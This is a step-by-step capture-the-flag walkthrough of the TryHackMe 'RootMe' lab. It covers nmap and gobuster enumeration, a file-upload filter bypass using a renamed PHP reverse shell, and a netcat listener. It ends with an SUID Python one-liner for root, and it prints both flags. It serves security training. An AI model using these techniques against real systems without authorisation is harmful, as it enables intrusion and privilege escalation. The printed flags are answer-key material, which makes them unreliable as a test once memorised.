# RootMe (rrootme)

## [RootMe on TryHackMe](https://tryhackme.com/room/rrootme)

## Overview

* **Difficulty:** Easy
* **Category:** Web Exploitation / Privilege Escalation
* **Skills Practiced:** Network enumeration, web directory discovery, file upload exploitation, reverse shell, SUID privilege escalation

## Tools & Techniques

* `nmap` – for port and service scanning
* `gobuster` – for directory brute-forcing
* PentestMonkey's PHP reverse shell – for initial access
* `nc` (netcat) – for the listener
* `find`, SUID file enumeration – for privilege escalation
* GTFObins – to exploit SUID Python for root shell

## Walkthrough (Step-by-Step)

### 1. Deployment & Setup

* Connect to TryHackMe with OpenVPN or use the AttackBox.
* Deploy the **RootMe** machine.

### 2. Reconnaissance

1. **Nmap Scan**

	```bash
	nmap -sC -sV <target-ip>
	```

	**Findings:**

	* Port 22 → OpenSSH 7.6p1 (Ubuntu)
	* Port 80 → Apache httpd 2.4.29 (Ubuntu)

2. **Directory Enumeration (GoBuster)**

	```bash
	gobuster dir -u http://<target-ip> -w <wordlist>
	```

	**Discovered:**

	```
	/panel                (Status: 301) [Size: 310] [--> http://<target-ip>/panel/]
	/uploads              (Status: 301) [Size: 312]
	```

### 3. Getting a Shell

* Navigate to `http://<target-ip>/panel/`; access a file upload form.
* Download the PHP reverse shell script (e.g., PentestMonkey’s version) and configure your attacker's IP and port.
* Since `.php` files are blocked, rename it (e.g., `.php5`).
* Upload via the panel and browse to it under `/uploads/`.
* Start a listener:

	```bash
	nc -lvnp <port>
	```
* Click the uploaded shell—reverse connection granted as `www-data`.
* Use `find / -type f -name user.txt 2>/dev/null` to locate and capture the **user** flag `THM{y0u_g0t_a_sh3ll}`.

### 4. Privilege Escalation

* Enumerate SUID binaries:

	```bash
	find / -perm -u=s -type f 2>/dev/null
	```
* Identify **/usr/bin/python** as suspicious (SUID bit set).
* Look up exploitation method on **GTFObins** — use:

	```bash
	python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
	```
* Gain a root shell.
* Read **root.txt** for the root flag: `THM{pr1v1l3g3_3sc4l4t10n}`.
